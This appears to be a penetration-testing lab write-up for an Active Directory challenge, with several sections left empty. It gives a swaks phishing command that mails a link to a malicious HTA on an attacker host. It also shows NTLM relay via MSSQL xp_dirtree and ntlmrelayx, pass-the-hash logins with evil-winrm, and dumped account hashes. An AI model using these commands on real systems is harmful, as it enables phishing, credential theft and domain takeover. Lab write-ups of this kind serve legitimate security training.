# Challenge 4

## Enumeration



### 192.168.57.159

### 172.16.57.150

### 172.16.57.151

### 172.16.57.152

### 172.16.57.155





Contact information

Will@tricky.com serves in the clerks office for mail administration. You can mail him about issues with the mail system.

Note that due to security issues arising from malicious mails, we have implemented very good security on the clients, such as antivirus, application whitelisting and removed all Office products.

`swaks --body 'Please click here http://192.168.49.64/cmd.hta' --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --header "Subject: Definitely not malware" -t will@tricky.com -f will@tricky.com --server 192.168.64.159`

## Initial Access

## Domain Enumeration



## Domain Escalation

After running bloodhound and running analysis the path to Domain Administrator appears to be pretty straight forward.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### SQL07

Exploitation

{% code overflow="wrap" %}
```bash
# We can remotely login to SQL05 
proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py will:fdsfssdfDFG4@172.16.100.151 -port 1433 -windows-auth
# Start ntlmrelayx to relay to hash to SQL07
proxychains python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.100.152
# Run SQL query to so NTLMRelayx can forward the hash
EXECUTE ('master.sys.xp_dirtree "\\192.168.49.100\test"')
# Login remotely using hash
proxychains evil-winrm -i 172.16.100.152 -u administrator -H f097f4c64a2af8f0057015a40367ecd9
```
{% endcode %}

Hashes

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f097f4c64a2af8f0057015a40367ecd9:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cf24abb0dd2ff42591001e892d98d690:::
setup:1001:aad3b435b51404eeaad3b435b51404ee:c406ffc61eb698198ad5e88d2f3a344a:::
```

### SQL05

Exploitation

{% code overflow="wrap" %}
```bash
# We can remotely login to SQL07
proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py will:fdsfssdfDFG4@172.16.100.152 -port 1433 -windows-auth
# Start ntlmrelayx to relay to hash to SQL05
proxychains python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.100.151
# Run SQL query to so NTLMRelayx can forward the hash
EXECUTE ('master.sys.xp_dirtree "\\192.168.49.100\test"')
# Login remotely using hash
proxychains evil-winrm -i 172.16.100.152 -u administrator -H f097f4c64a2af8f0057015a40367ecd9
```
{% endcode %}

Hashes

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f11d19a668e5b6532fe2b6324aef5641:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:807e88817b41a28e6a46892728b03ce7:::
setup:1001:aad3b435b51404eeaad3b435b51404ee:85c14abd05f0e6107af13f55fddffdc3:::
```
